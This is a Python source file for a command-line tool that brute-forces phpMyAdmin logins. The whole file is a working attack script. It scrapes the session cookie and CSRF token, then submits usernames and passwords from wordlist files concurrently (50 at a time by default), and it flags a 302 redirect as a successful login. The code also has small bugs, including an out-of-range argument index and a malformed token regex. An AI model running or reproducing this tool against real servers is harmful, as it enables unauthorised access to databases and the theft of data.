#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @File  : phpMyAdmin_Boom.py
# @Author: ShenHao
# @Contact : metashen@qq.com
# @Date  : 20-5-6下午7:54
# @Desc  : phpMyAdmin爆破工具


import requests
import re
import sys
import gevent
import pyfiglet


flag = False

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
    # 'Cookie':'pmaCookieVer=5; pma_lang=zh_CN; pma_collation_connection=utf8mb4_unicode_ci; phpMyAdmin=vo6nt8q71hsv93fb9a7c5b5oot2215gq',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
}


def init():
    banners = pyfiglet.figlet_format('phpMyAdmin Boom')
    print(banners)
    print('\t\t\t\t\t\tPower by metaStor  v1.0\n\n')


def attack(url, user, password):
    global flag
    if flag:
        sys.exit(0)
    header = headers
    print('[-] Attempt\t%s - %s' % (user, password))
    # first get
    resp = requests.get(url, headers=headers)
    cookie = resp.headers['Set-Cookie']
    # 在header中
    set_session = re.findall(r'phpMyAdmin=(.*?);', cookie)
    header[
        'Cookie'] = 'pmaCookieVer=5; pma_lang=zh_CN; pma_collation_connection=utf8mb4_unicode_ci; phpMyAdmin=%s' % set_session
    # 在响应的源代码中
    token = re.findall(r'<input type="hidden" name="token" value="(.*?) />', resp.text)[0]
    # print(resp.text)
    # print(token)
    post_data = {"pma_username": user, "pma_password": password, "server": "1", "target": "index.php", "token": token}
    # Redirects
    # response = requests.post(url + r"/index.php", data=post_data, allow_redirects=True)
    # no Redirects
    response = requests.post(url + r"/index.php", data=post_data, headers=header, allow_redirects=False)
    # flag of success
    # Redirects
    # if "themes/pmahomme/img/logo_right.png" in str(response.text):
    # if "phpMyAdmin is more friendly with a " in str(response.text):
    # no Redirects
    if response.status_code == 302:
        print("\033[1;31;44m[!] Find it!  ==>\t%s %s \033[0m" % (user, password))
        flag = True
        sys.exit(0)


# 多线程(默认为50)
def run(url, user, passwords, thread):
    with open(passwords, 'r') as fp:
        _password = fp.read().split()  # 以\n分割
        for index in range(0, len(_password), thread):
            # number of thread
            task = []
            for p in _password[index: index + thread]:
                task.append(gevent.spawn(attack, url, user, p))
            gevent.joinall(task)


def exception():
    print('Usage: python phpMyAdmin_Boom.py -u <url> -l <user>/<user file> -p <password file>')
    print("""
Options:
  -h, --help       Show help message and exit
  -u=URL           Url, http://site/phpmyadmin
  -l=USERNAME      Username or path
  -p=PASSWORD      Password path
  -s=THREAD        The Number of Threads
"""
          )
    exit(-1)


if __name__ == '__main__':
    init()
    # Usage
    args = sys.argv
    if len(args) <= 6 or '-h' in args or '--help' in args:
        exception()
    # Parse parameters
    else:
        url = str(args[2])
        users = str(args[4])  # ['root', 'mysql', 'guest', 'test']
        passwords = str(args[6])
        if len(args) == 8:
            threads = int(args[8])
        else:
            threads = 50  # (默认为50)
        # Password must be a file
        if '.' in passwords:
            # Username with a file
            if '.' in users:
                for line in open(users, 'r'):
                    user = line.strip()
                    run(url, user, passwords, threads)
            # Just a username
            else:
                run(url, users, passwords, threads)
            print("\n[!] Complete")
        else:
            exception()
